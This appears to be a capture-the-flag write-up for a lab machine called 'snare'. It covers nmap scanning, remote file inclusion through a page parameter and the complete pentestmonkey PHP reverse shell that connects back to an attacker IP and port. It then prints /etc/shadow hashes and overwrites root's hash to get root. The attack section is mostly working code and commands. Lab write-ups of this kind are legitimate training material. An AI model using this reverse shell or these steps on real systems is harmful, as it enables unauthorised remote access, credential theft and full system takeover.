![image](https://user-images.githubusercontent.com/87468669/204126974-8404620b-08e5-44cc-9fc2-7004dedf7733.png)

First we start with an nmap scan
`nmap -sC -sV -T4 -oN nmap.txt`

```
# Nmap 7.93 scan initiated Sat Nov 19 21:22:26 2022 as: nmap -sC -sV -T4 -oN quicknmap.txt -Pn 10.150.150.18
Nmap scan report for 10.150.150.18
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f0e73d4ae73147ec51c1584ef45a4d1 (RSA)
|_  256 390b0bc986c98eb52b0c39c763ece210 (ECDSA)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 19 21:22:58 2022 -- 1 IP address (1 host up) scanned in 31.80 seconds
```

we have port 22 (ssh) and 80 (http) opened, let's enumerate http first.

![image](https://user-images.githubusercontent.com/87468669/204127066-98c6d6cf-be6c-48ea-a3a0-aff5f87e117f.png)

sweet!!!, we have a parameter, let's test for rfi (remote file inclusion). first we create a reverse shell.php file.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.66.67.146';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![image](https://user-images.githubusercontent.com/87468669/220051355-306405fd-3350-40a0-91ea-7a2172900566.png)

fireup python http server and ncat listener, then go to the browser and try download the file into the target 

![image](https://user-images.githubusercontent.com/87468669/220052511-018c860c-0dff-4c51-803b-8fe130b06d4a.png)

download the file through the url parameter as `shell` it automatically add `.php` to the end.

![image](https://user-images.githubusercontent.com/87468669/220052709-70e69e91-5de3-42da-8716-12d33fc39200.png)

Boom!!! we got a reverse shell. now let'ss escalate privs.


## Privilege Escalation

```
www-data@snare:/var/www/html/includes$ find /etc -type f -writable 2>/dev/null
/etc/shadow
www-data@snare:/var/www/html/includes$ ls -al /etc/shadow
-rwxrwxrwx 1 root shadow 1129 Nov 20  2020 /etc/shadow
www-data@snare:/var/www/html/includes$ cat /etc/shadow
root:$6$b8wkwLbICzuTqPiO$dFLYb8ZNEpfGLRnvODlyGfjtZQTV85FJCDCBGiZEU9b3laym9RJo144xkYEldB419O1Q3E5FARrKRRn/LrtZc0:18586:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18579:0:99999:7:::
systemd-coredump:!!:18579::::::
snare:$6$H64MOvr/bVP1M3TM$ITTpmiB7QNgv7EARjOcIMgeBvbCXlDOU5LqjA7q0ivXWhevk7HbatblgH7Yc1y8aUo0pnASOhJgjWRlGMsusu/:18586:0:99999:7:::
lxd:!:18579::::::
```

after playing around for sometime, we found out that the `etc/shadow` file is writable. Let's exploit this priv
Knowing that we can write to this file, let’s create a password hash that we control. While all we need to do is generate a SHA-512 hash, we can actually use a pre-installed utility called mkpasswd to generate one for us.
mkpasswd -m sha-512 "hacked"

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/snare]
└─$ mkpasswd -m sha-512 hacked
$6$OVBq072zKPY/QEwL$wf9r2CipI85YKYdgpI6dcRbTyYegsBV8hBtXYFVGvMyIkM80X5TCikzskSz.vTXGH7Ike6BSUQ7nbaUMCMJzZ1
```

Copy the hash that gets generated, and lets go edit the /etc/shadow file. `nano /etc/shadow`

![image](https://user-images.githubusercontent.com/87468669/220056717-c5a3c095-b14c-4826-a440-4215e61f6210.png)

Once the file has been changed, you can now switch to the root user using the password you passed to the mkpasswd command.
`su root`

![image](https://user-images.githubusercontent.com/87468669/220057081-48e0647e-a0a3-4f41-add4-779fb8ac3fe3.png)

Bull's eye and we got root.

